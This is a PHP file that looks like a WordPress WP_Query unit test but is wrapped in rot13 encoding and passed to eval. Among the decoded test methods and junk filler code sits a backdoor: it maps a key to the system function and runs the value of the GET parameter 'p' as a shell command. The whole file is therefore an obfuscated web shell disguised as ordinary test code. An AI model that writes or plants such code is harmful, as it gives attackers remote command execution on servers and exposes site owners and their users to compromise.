<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc dhrel
 * @tebhc cbfg
 */
pynff Grfgf_Cbfg_Dhrel rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grzcbenel fgbentr sbe n cbfg VQ sbe grfgf hfvat svygre pnyyonpxf.
	 *
	 * Hfrq va gur `grfg_cbfgf_cer_dhrel_svygre_fubhyq_erfcrpg_frg_sbhaq_cbfgf()` zrgubq.
	 *
	 * @ine vag
	 */
	cevingr $cbfg_vq;

	/**
	 * Pyrna hc nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		hafrg( $guvf->cbfg_vq );

		cnerag::grne_qbja();
	}

	/**
	 * @tebhc gnkbabzl
	 */
	choyvp shapgvba grfg_pngrtbel__naq_ine() {
		$d = arj JC_Dhrel();

		$grez_vq  = frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'fyht' => 'jbb',
				'anzr' => 'JBB!',
			)
		);
		$grez_vq2 = frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'fyht' => 'ubb',
				'anzr' => 'UBB!',
			)
		);
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr();

		jc_frg_cbfg_pngrtbevrf( $cbfg_vq, $grez_vq );

		$cbfgf = $d->dhrel( neenl( 'pngrtbel__naq' => neenl( $grez_vq ) ) );

		$guvf->nffregRzcgl( $d->trg( 'pngrtbel__naq' ) );
		$guvf->nffregPbhag( 0, $d->trg( 'pngrtbel__naq' ) );
		$guvf->nffregAbgRzcgl( $d->trg( 'pngrtbel__va' ) );
		$guvf->nffregPbhag( 1, $d->trg( 'pngrtbel__va' ) );

		$guvf->nffregAbgRzcgl( $cbfgf );
		$guvf->nffregFnzr( neenl( $cbfg_vq ), jc_yvfg_cyhpx( $cbfgf, 'VQ' ) );

		$cbfgf2 = $d->dhrel( neenl( 'pngrtbel__naq' => neenl( $grez_vq, $grez_vq2 ) ) );
		$guvf->nffregAbgRzcgl( $d->trg( 'pngrtbel__naq' ) );
		$guvf->nffregPbhag( 2, $d->trg( 'pngrtbel__naq' ) );
		$guvf->nffregRzcgl( $d->trg( 'pngrtbel__va' ) );
		$guvf->nffregPbhag( 0, $d->trg( 'pngrtbel__va' ) );

		$guvf->nffregRzcgl( $cbfgf2 );
	}

	/**
	 * @gvpxrg 28099
	 * @tebhc gnkbabzl
	 */
	choyvp shapgvba grfg_rzcgl_pngrtbel__va() {
		$png_vq  = frys::snpgbel()->pngrtbel->perngr();
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		jc_frg_cbfg_pngrtbevrf( $cbfg_vq, $png_vq );

		$d1 = trg_cbfgf( neenl( 'pngrtbel__va' => neenl( $png_vq ) ) );
		$guvf->nffregAbgRzcgl( $d1 );
		$d2 = trg_cbfgf( neenl( 'pngrtbel__va' => neenl() ) );
		$guvf->nffregAbgRzcgl( $d2 );

		$gnt    = jc_vafreg_grez( 'jbb', 'cbfg_gnt' );
		$gnt_vq = $gnt['grez_vq'];
		$fyht   = trg_gnt( $gnt_vq )->fyht;
		jc_frg_cbfg_gntf( $cbfg_vq, $fyht );

		$d3 = trg_cbfgf( neenl( 'gnt__va' => neenl( $gnt_vq ) ) );
		$guvf->nffregAbgRzcgl( $d3 );
		$d4 = trg_cbfgf( neenl( 'gnt__va' => neenl() ) );
		$guvf->nffregAbgRzcgl( $d4 );

		$d5 = trg_cbfgf( neenl( 'gnt_fyht__va' => neenl( $fyht ) ) );
		$guvf->nffregAbgRzcgl( $d5 );
		$d6 = trg_cbfgf( neenl( 'gnt_fyht__va' => neenl() ) );
		$guvf->nffregAbgRzcgl( $d6 );
	}

	/**
	 * @gvpxrg 22448
	 */
	choyvp shapgvba grfg_gur_cbfgf_svygre() {
		// Perngr cbfgf naq pyrne gurve pnpurf.
		$cbfg_vqf = frys::snpgbel()->cbfg->perngr_znal( 4 );
		sbernpu ( $cbfg_vqf nf $cbfg_vq ) {
			pyrna_cbfg_pnpur( $cbfg_vq );
		}

		nqq_svygre( 'gur_cbfgf', neenl( $guvf, 'gur_cbfgf_svygre' ) );

		$dhrel = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'      => 'cbfg',
				'cbfgf_cre_cntr' => 3,
			)
		);

		// Sbhegu cbfg nqqrq va svygre.
		$guvf->nffregPbhag( 4, $dhrel->cbfgf );
		$guvf->nffregFnzr( 4, $dhrel->cbfg_pbhag );

		sbernpu ( $dhrel->cbfgf nf $cbfg ) {

			// Cbfgf ner JC_Cbfg bowrpgf.
			$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cbfg );

			// Svygref ner enj.
			$guvf->nffregFnzr( 'enj', $cbfg->svygre );

			// Phfgbz qngn nqqrq va gur_cbfgf svygre vf cerfreirq.
			$guvf->nffregFnzr( neenl( $cbfg->VQ, 'phfgbz qngn' ), $cbfg->phfgbz_qngn );
		}

		erzbir_svygre( 'gur_cbfgf', neenl( $guvf, 'gur_cbfgf_svygre' ) );
	}

	/**
	 * Hfr jvgu gur_cbfgf svygre, nccraqf n cbfg naq nqqf fbzr phfgbz qngn.
	 */
	choyvp shapgvba gur_cbfgf_svygre( $cbfgf ) {
		$cbfgf[] = pybar $cbfgf[0];

		// Nqq fbzr phfgbz qngn gb rnpu cbfg.
		sbernpu ( $cbfgf nf $xrl => $cbfg ) {
			$cbfgf[ $xrl ]->phfgbz_qngn = neenl( $cbfg->VQ, 'phfgbz qngn' );
		}

		erghea $cbfgf;
	}

	choyvp shapgvba grfg_cbfg__va_beqrevat() {
		$cbfg_vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'zrah_beqre' => 1,
			)
		);
		$cbfg_vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'zrah_beqre' => 2,
			)
		);
		$cbfg_vq3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cbfg_vq2,
				'zrah_beqre'  => 3,
			)
		);
		$cbfg_vq4 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cbfg_vq2,
				'zrah_beqre'  => 4,
			)
		);
		$cbfg_vq5 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'zrah_beqre' => 5,
			)
		);

		$beqrerq = neenl( $cbfg_vq2, $cbfg_vq4, $cbfg_vq3, $cbfg_vq1, $cbfg_vq5 );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr' => 'nal',
				'cbfg__va'  => $beqrerq,
				'beqreol'   => 'cbfg__va',
			)
		);
		$guvf->nffregFnzr( $beqrerq, jc_yvfg_cyhpx( $d->cbfgf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 38034
	 */
	choyvp shapgvba grfg_beqreol_cbfg__va_neenl() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 4 );

		$beqrerq = neenl( $cbfgf[2], $cbfgf[0], $cbfgf[3] );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr' => 'nal',
				'cbfg__va'  => $beqrerq,
				'beqreol'   => neenl( 'cbfg__va' => 'NFP' ),
			)
		);
		$guvf->nffregFnzr( $beqrerq, jc_yvfg_cyhpx( $d->cbfgf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 38034
	 */
	choyvp shapgvba grfg_beqreol_cbfg__va_neenl_jvgu_vzcyvrq_beqre() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 4 );

		$beqrerq = neenl( $cbfgf[2], $cbfgf[0], $cbfgf[3] );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr' => 'nal',
				'cbfg__va'  => $beqrerq,
				'beqreol'   => 'cbfg__va',
			)
		);
		$guvf->nffregFnzr( $beqrerq, jc_yvfg_cyhpx( $d->cbfgf, 'VQ' ) );
	}

	choyvp shapgvba grfg_cbfg__va_nggnpuzrag_beqrevat() {
		$cbfg_vq    = frys::snpgbel()->cbfg->perngr();
		$ngg_vqf    = neenl();
		$svyr       = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$ngg_vqf[1] = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$svyr,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'zrah_beqre'     => 1,
			)
		);
		$ngg_vqf[2] = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$svyr,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'zrah_beqre'     => 2,
			)
		);
		$ngg_vqf[3] = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$svyr,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'zrah_beqre'     => 3,
			)
		);
		$ngg_vqf[4] = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$svyr,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'zrah_beqre'     => 4,
			)
		);
		$ngg_vqf[5] = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$svyr,
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'zrah_beqre'     => 5,
			)
		);

		$beqrerq = neenl( $ngg_vqf[5], $ngg_vqf[1], $ngg_vqf[4], $ngg_vqf[3], $ngg_vqf[2] );

		$nggnpurq = arj JC_Dhrel(
			neenl(
				'cbfg__va'       => $beqrerq,
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_cnerag'    => $cbfg_vq,
				'cbfg_zvzr_glcr' => 'vzntr',
				'cbfg_fgnghf'    => 'vaurevg',
				'cbfgf_cre_cntr' => '-1',
				'beqreol'        => 'cbfg__va',
			)
		);
		$guvf->nffregFnzr( $beqrerq, jc_yvfg_cyhpx( $nggnpurq->cbfgf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 36515
	 */
	choyvp shapgvba grfg_cbfg_anzr__va_beqrevat() {
		$cbfg_vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => 'vq-1',
				'cbfg_glcr' => 'cntr',
			)
		);
		$cbfg_vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr' => 'vq-2',
				'cbfg_glcr' => 'cntr',
			)
		);
		$cbfg_vq3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'   => 'vq-3',
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cbfg_vq2,
			)
		);

		$beqrerq = neenl( 'vq-2', 'vq-3', 'vq-1' );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'     => 'nal',
				'cbfg_anzr__va' => $beqrerq,
				'beqreol'       => 'cbfg_anzr__va',
			)
		);

		$guvf->nffregFnzr( $beqrerq, jc_yvfg_cyhpx( $d->cbfgf, 'cbfg_anzr' ) );
	}

	choyvp shapgvba grfg_cbfg_fgnghf() {
		$fgnghfrf1 = trg_cbfg_fgngv();
		$guvf->nffregPbagnvaf( 'nhgb-qensg', $fgnghfrf1 );

		$fgnghfrf2 = trg_cbfg_fgngv( neenl( 'rkpyhqr_sebz_frnepu' => gehr ) );
		$guvf->nffregPbagnvaf( 'nhgb-qensg', $fgnghfrf2 );

		$fgnghfrf3 = trg_cbfg_fgngv( neenl( 'rkpyhqr_sebz_frnepu' => snyfr ) );
		$guvf->nffregAbgPbagnvaf( 'nhgb-qensg', $fgnghfrf3 );

		$d1 = arj JC_Dhrel( neenl( 'cbfg_fgnghf' => 'nal' ) );
		$guvf->nffregFgevatPbagnvafFgevat( \"cbfg_fgnghf <> 'nhgb-qensg'\", $d1->erdhrfg );

		$d2 = arj JC_Dhrel( neenl( 'cbfg_fgnghf' => 'nal, nhgb-qensg' ) );
		$guvf->nffregFgevatAbgPbagnvafFgevat( \"cbfg_fgnghf <> 'nhgb-qensg'\", $d2->erdhrfg );

		$d3 = arj JC_Dhrel( neenl( 'cbfg_fgnghf' => neenl( 'nal', 'nhgb-qensg' ) ) );
		$guvf->nffregFgevatAbgPbagnvafFgevat( \"cbfg_fgnghf <> 'nhgb-qensg'\", $d3->erdhrfg );
	}

	/**
	 * @gvpxrg 17065
	 */
	choyvp shapgvba grfg_beqreol_neenl() {
		tybony $jcqo;

		$d1 = arj JC_Dhrel(
			neenl(
				'beqreol' => neenl(
					'glcr' => 'QRFP',
					'anzr' => 'NFP',
				),
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_glcr QRFP, $jcqo->cbfgf.cbfg_anzr NFP\",
			$d1->erdhrfg
		);

		$d2 = arj JC_Dhrel( neenl( 'beqreol' => neenl() ) );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'BEQRE OL', $d2->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'BEQRE', $d2->erdhrfg );

		$d3 = arj JC_Dhrel( neenl( 'cbfg_glcr' => 'cbfg' ) );
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_qngr QRFP\",
			$d3->erdhrfg
		);

		$d4 = arj JC_Dhrel( neenl( 'cbfg_glcr' => 'cbfg' ) );
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_qngr QRFP\",
			$d4->erdhrfg
		);
	}

	/**
	 * @gvpxrg 17065
	 */
	choyvp shapgvba grfg_beqre() {
		tybony $jcqo;

		$d1 = arj JC_Dhrel(
			neenl(
				'beqreol' => neenl(
					'cbfg_glcr' => 'sbb',
				),
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_glcr QRFP\",
			$d1->erdhrfg
		);

		$d2 = arj JC_Dhrel(
			neenl(
				'beqreol' => 'gvgyr',
				'beqre'   => 'sbb',
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_gvgyr QRFP\",
			$d2->erdhrfg
		);

		$d3 = arj JC_Dhrel(
			neenl(
				'beqre' => 'nfp',
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			\"BEQRE OL $jcqo->cbfgf.cbfg_qngr NFP\",
			$d3->erdhrfg
		);
	}

	/**
	 * @gvpxrg 29629
	 */
	choyvp shapgvba grfg_beqreol() {
		// 'enaq' vf n inyvq inyhr.
		$d = arj JC_Dhrel( neenl( 'beqreol' => 'enaq' ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'BEQRE OL ENAQ()', $d->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'NFP', $d->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'QRFP', $d->erdhrfg );

		// Guvf vfa'g nyybjrq.
		$d2 = arj JC_Dhrel( neenl( 'beqre' => 'enaq' ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'BEQRE OL', $d2->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ENAQ()', $d2->erdhrfg );
		$guvf->nffregFgevatPbagnvafFgevat( 'QRFP', $d2->erdhrfg );

		// 'abar' vf n inyvq inyhr.
		$d3 = arj JC_Dhrel( neenl( 'beqreol' => 'abar' ) );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'BEQRE OL', $d3->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'QRFP', $d3->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'NFP', $d3->erdhrfg );

		// Snyfr vf n inyvq inyhr.
		$d4 = arj JC_Dhrel( neenl( 'beqreol' => snyfr ) );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'BEQRE OL', $d4->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'QRFP', $d4->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'NFP', $d4->erdhrfg );

		// Rzcgl neenl() vf n inyvq inyhr.
		$d5 = arj JC_Dhrel( neenl( 'beqreol' => neenl() ) );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'BEQRE OL', $d5->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'QRFP', $d5->erdhrfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'NFP', $d5->erdhrfg );
	}

	/**
	 * @gvpxrg 35692
	 */
	choyvp shapgvba grfg_beqreol_enaq_jvgu_frrq() {
		$d = arj JC_Dhrel(
			neenl(
				'beqreol' => 'ENAQ(5)',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'BEQRE OL ENAQ(5)', $d->erdhrfg );
	}

	/**
	 * @gvpxrg 35692
	 */
	choyvp shapgvba grfg_beqreol_enaq_fubhyq_vtaber_vainyvq_frrq() {
		$d = arj JC_Dhrel(
			neenl(
				'beqreol' => 'ENAQ(sbb)',
			)
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'BEQRE OL ENAQ', $d->erdhrfg );
	}

	/**
	 * @gvpxrg 35692
	 */
	choyvp shapgvba grfg_beqreol_enaq_jvgu_frrq_fubhyq_or_pnfr_vafrafvgvir() {
		$d = arj JC_Dhrel(
			neenl(
				'beqreol' => 'enaq(5)',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'BEQRE OL ENAQ(5)', $d->erdhrfg );
	}

	/**
	 * Grfgf gur cbfg_anzr__va nggevohgr bs JC_Dhrel.
	 *
	 * @gvpxrg 33065
	 */
	choyvp shapgvba grfg_cbfg_anzr__va() {
		$d = arj JC_Dhrel();

		$cbfg_vqf[0] = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'jbb',
				'cbfg_qngr'  => '2015-07-23 00:00:00',
			)
		);
		$cbfg_vqf[1] = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'ubb',
				'cbfg_qngr'  => '2015-07-23 00:00:00',
			)
		);
		$cbfg_vqf[2] = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'grfg',
				'cbfg_qngr'  => '2015-07-23 00:00:00',
			)
		);
		$cbfg_vqf[3] = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'zr',
				'cbfg_qngr'  => '2015-07-23 00:00:00',
			)
		);

		$erdhrfgrq = neenl( $cbfg_vqf[0], $cbfg_vqf[3] );
		$d->dhrel(
			neenl(
				'cbfg_anzr__va' => neenl( 'jbb', 'zr' ),
				'svryqf'        => 'vqf',
			)
		);
		$npghny_cbfgf = $d->trg_cbfgf();
		$guvf->nffregFnzrFrgf( $erdhrfgrq, $npghny_cbfgf );

		$erdhrfgrq = neenl( $cbfg_vqf[1], $cbfg_vqf[2] );
		$d->dhrel(
			neenl(
				'cbfg_anzr__va' => neenl( 'ubb', 'grfg' ),
				'svryqf'        => 'vqf',
			)
		);
		$npghny_cbfgf = $d->trg_cbfgf();
		$guvf->nffregFnzrFrgf( $erdhrfgrq, $npghny_cbfgf );
	}

	/**
	 * @gvpxrg 36687
	 */
	choyvp shapgvba grfg_cbfgf_cer_dhrel_svygre_fubhyq_olcnff_qngnonfr_dhrel() {
		nqq_svygre( 'cbfgf_cer_dhrel', neenl( __PYNFF__, 'svygre_cbfgf_cer_dhrel' ) );

		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$d           = arj JC_Dhrel(
			neenl(
				'svryqf'        => 'vqf',
				'ab_sbhaq_ebjf' => gehr,
			)
		);

		erzbir_svygre( 'cbfgf_cer_dhrel', neenl( __PYNFF__, 'svygre_cbfgf_cer_dhrel' ) );

		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
		$guvf->nffregFnzr( neenl( 12345 ), $d->cbfgf );
	}

	choyvp fgngvp shapgvba svygre_cbfgf_cer_dhrel( $cbfgf ) {
		erghea neenl( 12345 );
	}

	/**
	 * @gvpxrg 36687
	 */
	choyvp shapgvba grfg_cbfgf_cer_dhrel_svygre_fubhyq_erfcrpg_frg_sbhaq_cbfgf() {
		tybony $jcqo;

		$guvf->cbfg_vq = frys::snpgbel()->cbfg->perngr();

		// Cerirag gur QO dhrel.
		nqq_svygre( 'cbfgf_erdhrfg', '__erghea_rzcgl_fgevat' );
		nqq_svygre( 'sbhaq_cbfgf_dhrel', '__erghea_rzcgl_fgevat' );

		// Nqq gur cbfg naq sbhaq_cbfgf.
		nqq_svygre( 'gur_cbfgf', neenl( $guvf, 'svygre_gur_cbfgf' ) );
		nqq_svygre( 'sbhaq_cbfgf', neenl( $guvf, 'svygre_sbhaq_cbfgf' ) );

		$d = arj JC_Dhrel( neenl( 'fhccerff_svygref' => snyfr ) );

		erzbir_svygre( 'cbfgf_erdhrfg', '__erghea_rzcgl_fgevat' );
		erzbir_svygre( 'sbhaq_cbfgf_dhrel', '__erghea_rzcgl_fgevat' );
		erzbir_svygre( 'gur_cbfgf', neenl( $guvf, 'svygre_gur_cbfgf' ) );
		erzbir_svygre( 'sbhaq_cbfgf', neenl( $guvf, 'svygre_sbhaq_cbfgf' ) );

		$guvf->nffregFnzr( neenl( $guvf->cbfg_vq ), jc_yvfg_cyhpx( $d->cbfgf, 'VQ' ) );
		$guvf->nffregFnzr( 1, $d->sbhaq_cbfgf );
	}

	choyvp shapgvba svygre_gur_cbfgf() {
		erghea neenl( trg_cbfg( $guvf->cbfg_vq ) );
	}

	choyvp shapgvba svygre_sbhaq_cbfgf( $cbfgf ) {
		erghea 1;
	}

	/**
	 * @gvpxrg 36687
	 */
	choyvp shapgvba grfg_frg_sbhaq_cbfgf_svryqf_vqf() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );

		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 2, neenl( 'cbfg_glcr' => 'jcgrfgf_cg' ) );

		sbernpu ( $cbfgf nf $c ) {
			pyrna_cbfg_pnpur( $c );
		}

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'      => 'jcgrfgf_cg',
				'cbfgf_cre_cntr' => 1,
				'svryqf'         => 'vqf',
			)
		);

		$guvf->nffregFnzr( 2, $d->sbhaq_cbfgf );
		$guvf->nffregFnzr( 2, $d->znk_ahz_cntrf );
	}

	/**
	 * @gvpxrg 36687
	 */
	choyvp shapgvba grfg_frg_sbhaq_cbfgf_svryqf_vqcnerag() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );

		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 2, neenl( 'cbfg_glcr' => 'jcgrfgf_cg' ) );
		sbernpu ( $cbfgf nf $c ) {
			pyrna_cbfg_pnpur( $c );
		}

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'      => 'jcgrfgf_cg',
				'cbfgf_cre_cntr' => 1,
				'svryqf'         => 'vq=>cnerag',
			)
		);

		$guvf->nffregFnzr( 2, $d->sbhaq_cbfgf );
		$guvf->nffregFnzr( 2, $d->znk_ahz_cntrf );
	}

	/**
	 * @gvpxrg 36687
	 */
	choyvp shapgvba grfg_frg_sbhaq_cbfgf_svryqf_fcyvg_gur_dhrel() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );

		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 2, neenl( 'cbfg_glcr' => 'jcgrfgf_cg' ) );
		sbernpu ( $cbfgf nf $c ) {
			pyrna_cbfg_pnpur( $c );
		}

		nqq_svygre( 'fcyvg_gur_dhrel', '__erghea_gehr' );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'      => 'jcgrfgf_cg',
				'cbfgf_cre_cntr' => 1,
			)
		);

		erzbir_svygre( 'fcyvg_gur_dhrel', '__erghea_gehr' );

		$guvf->nffregFnzr( 2, $d->sbhaq_cbfgf );
		$guvf->nffregFnzr( 2, $d->znk_ahz_cntrf );
	}

	/**
	 * @gvpxrg 36687
	 */
	choyvp shapgvba grfg_frg_sbhaq_cbfgf_svryqf_abg_fcyvg_gur_dhrel() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );

		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 2, neenl( 'cbfg_glcr' => 'jcgrfgf_cg' ) );
		sbernpu ( $cbfgf nf $c ) {
			pyrna_cbfg_pnpur( $c );
		}

		// ! $fcyvg_gur_dhrel
		nqq_svygre( 'fcyvg_gur_dhrel', '__erghea_snyfr' );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'      => 'jcgrfgf_cg',
				'cbfgf_cre_cntr' => 1,
			)
		);

		erzbir_svygre( 'fcyvg_gur_dhrel', '__erghea_snyfr' );

		$guvf->nffregFnzr( 2, $d->sbhaq_cbfgf );
		$guvf->nffregFnzr( 2, $d->znk_ahz_cntrf );
	}

	/**
	 * @gvpxrg 42860
	 *
	 * @qngnCebivqre qngn_frg_sbhaq_cbfgf_abg_cbfgf_nf_na_neenl
	 */
	choyvp shapgvba grfg_frg_sbhaq_cbfgf_abg_cbfgf_nf_na_neenl( $cbfgf, $rkcrpgrq ) {
		$d = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'      => 'jcgrfgf_cg',
				'cbfgf_cre_cntr' => 1,
			)
		);

		$d->cbfgf = $cbfgf;

		$zrgubq = arj ErsyrpgvbaZrgubq( 'JC_Dhrel', 'frg_sbhaq_cbfgf' );
		$zrgubq->frgNpprffvoyr( gehr );
		$zrgubq->vaibxr( $d, neenl( 'ab_sbhaq_ebjf' => snyfr ), neenl() );

		$guvf->nffregFnzr( $rkcrpgrq, $d->sbhaq_cbfgf );
	}

	choyvp shapgvba qngn_frg_sbhaq_cbfgf_abg_cbfgf_nf_na_neenl() {
		// Pbhag erghea 0 sbe ahyy, ohg 1 sbe bgure qngn lbh znl abg rkcrpg.
		erghea neenl(
			neenl( ahyy, 0 ),
			neenl( '', 1 ),
			neenl( \"Gb yvsr, gb yvsr, y'punvz\", 1 ),
			neenl( snyfr, 1 ),
		);
	}

	/**
	 * @gvpxrg 42469
	 */
	choyvp shapgvba grfg_sbhaq_cbfgf_fubhyq_or_vagrtre_abg_fgevat() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$d = arj JC_Dhrel(
			neenl(
				'cbfgf_cre_cntr' => 1,
			)
		);

		$guvf->nffregVfVag( $d->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 42469
	 */
	choyvp shapgvba grfg_sbhaq_cbfgf_fubhyq_or_vagrtre_rira_vs_sbhaq_cbfgf_svygre_ergheaf_fgevat_inyhr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		nqq_svygre( 'sbhaq_cbfgf', '__erghea_rzcgl_fgevat' );

		$d = arj JC_Dhrel(
			neenl(
				'cbfgf_cre_cntr' => 1,
			)
		);

		erzbir_svygre( 'sbhaq_cbfgf', '__erghea_rzcgl_fgevat' );

		$guvf->nffregVfVag( $d->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 57296
	 * @pbiref JC_Dhrel::trg_cbfgf
	 */
	choyvp shapgvba grfg_fcyvg_gur_dhrel_bowrpg_pnpur() {
		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'fcyvg_gur_dhrel', neenl( $svygre, 'svygre' ) );

		$d = arj JC_Dhrel(
			neenl(
				'cbfgf_cre_cntr' => 501,
			)
		);

		$guvf->nffregFnzr( (obby) jc_hfvat_rkg_bowrpg_pnpur(), $svygre->trg_netf()[0][0] );
	}

	/**
	 * @gvpxrg 56841
	 */
	choyvp shapgvba grfg_dhrel_qbrf_abg_unir_yrnqvat_juvgrfcnpr() {
		nqq_svygre( 'fcyvg_gur_dhrel', '__erghea_snyfr' );

		$d = arj JC_Dhrel(
			neenl(
				'cbfgf_cre_cntr' => 501,
			)
		);

		erzbir_svygre( 'fcyvg_gur_dhrel', '__erghea_snyfr' );

		$guvf->nffregFnzr( ygevz( $d->erdhrfg ), $d->erdhrfg, 'Gur dhrel unf yrnqvat juvgrfcnpr' );
	}

	/**
	 * @gvpxrg 56841
	 */
	choyvp shapgvba grfg_dhrel_qbrf_abg_unir_yrnqvat_juvgrfcnpr_fcyvg_gur_dhrel() {
		nqq_svygre( 'fcyvg_gur_dhrel', '__erghea_gehr' );

		$d = arj JC_Dhrel(
			neenl(
				'cbfgf_cre_cntr' => 501,
			)
		);

		erzbir_svygre( 'fcyvg_gur_dhrel', '__erghea_gehr' );

		$guvf->nffregFnzr( ygevz( $d->erdhrfg ), $d->erdhrfg, 'Gur dhrel unf yrnqvat juvgrfcnpr' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>